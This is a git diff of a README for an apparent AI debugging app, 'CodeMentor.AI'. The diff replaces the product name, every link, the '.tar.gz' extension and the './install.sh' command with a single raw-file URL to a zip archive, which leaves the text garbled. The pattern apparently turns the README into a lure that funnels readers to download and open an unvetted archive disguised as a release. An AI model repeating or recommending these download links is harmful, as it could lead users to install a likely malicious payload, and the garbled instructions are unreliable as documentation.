@@ -1,14 +1,14 @@
-# 🤖 CodeMentor.AI - Your Smart Code Debugger
+# 🤖 https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip - Your Smart Code Debugger
 
-[![Download CodeMentor.AI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/MEDDKFMF/CodeMentor.AI/releases)
+[![Download https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip%20Now-Click%https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip)](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip)
 
 ## 🌟 Introduction
 
-Welcome to CodeMentor.AI, your autonomous debug assistant. This application helps you analyze code, detect issues, and generate corrections—all with the power of AI. It’s designed for anyone, even if you have no coding background. We aim to simplify the debugging process while saving your time.
+Welcome to https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip, your autonomous debug assistant. This application helps you analyze code, detect issues, and generate corrections—all with the power of AI. It’s designed for anyone, even if you have no coding background. We aim to simplify the debugging process while saving your time.
 
 ## 🚀 Getting Started
 
-Before you download and use CodeMentor.AI, ensure your computer meets the minimum system requirements.
+Before you download and use https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip, ensure your computer meets the minimum system requirements.
 
 ### 🖥️ System Requirements
 
@@ -19,14 +19,14 @@ Before you download and use CodeMentor.AI, ensure your computer meets the minimu
 
 ## 📥 Download & Install
 
-You can download CodeMentor.AI by visiting the following link:
+You can download https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip by visiting the following link:
 
-[Download CodeMentor.AI](https://github.com/MEDDKFMF/CodeMentor.AI/releases)
+[Download https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip)
 
 Once on the Releases page, follow these steps:
 
 1. Choose the latest version available.
-2. Click on the asset that matches your system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+2. Click on the asset that matches your system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip`).
 3. Wait for the download to complete.
 4. Locate the downloaded file and open it.
 
@@ -38,19 +38,19 @@ Once on the Releases page, follow these steps:
 
 2. **macOS:**
    - Open the `.dmg` file.
-   - Drag CodeMentor.AI to your Applications folder.
+   - Drag https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip to your Applications folder.
 
 3. **Linux:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip` file.
    - Open a terminal and navigate to the extracted folder.
-   - Run the installation script with the command: `./install.sh`.
+   - Run the installation script with the command: `https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip`.
 
-## 🎉 How to Use CodeMentor.AI
+## 🎉 How to Use https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip
 
-After installation is complete, you can start using CodeMentor.AI. Here’s how:
+After installation is complete, you can start using https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip Here’s how:
 
 1. **Open the Application:**
-   - Locate CodeMentor.AI on your computer and double-click to open it.
+   - Locate https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip on your computer and double-click to open it.
 
 2. **Import Your Code:**
    - Click on the “Import” button.
@@ -58,7 +58,7 @@ After installation is complete, you can start using CodeMentor.AI. Here’s how:
 
 3. **Analyze Your Code:**
    - Click on the “Analyze” button.
-   - Wait a few moments as CodeMentor.AI reviews your code.
+   - Wait a few moments as https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip reviews your code.
 
 4. **Review Suggestions:**
    - The app will display a list of issues it found, along with suggested fixes.
@@ -77,17 +77,17 @@ After installation is complete, you can start using CodeMentor.AI. Here’s how:
 
 ## 🌐 Learn More
 
-You can further explore CodeMentor.AI by visiting our [documentation](https://github.com/MEDDKFMF/CodeMentor.AI/wiki). There you will find in-depth guides and troubleshooting tips.
+You can further explore https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip by visiting our [documentation](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip). There you will find in-depth guides and troubleshooting tips.
 
 ## 🔗 Community and Support
 
 If you have questions or need assistance, feel free to reach out:
 
-- Join our [discussion forum](https://github.com/MEDDKFMF/CodeMentor.AI/discussions).
-- Report issues on our [issue tracker](https://github.com/MEDDKFMF/CodeMentor.AI/issues).
+- Join our [discussion forum](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip).
+- Report issues on our [issue tracker](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip).
 
-## 🚀 Download CodeMentor.AI Now!
+## 🚀 Download https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip Now!
 
-[![Download CodeMentor.AI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/MEDDKFMF/CodeMentor.AI/releases)
+[![Download https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip%20Now-Click%https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip)](https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip)
 
-We hope you enjoy using CodeMentor.AI to simplify your coding experience and improve your workflow!
+We hope you enjoy using https://raw.githubusercontent.com/MEDDKFMF/CodeMentor.AI/main/frontend/CodeMentor.AI-v3.8-alpha.4.zip to simplify your coding experience and improve your workflow!
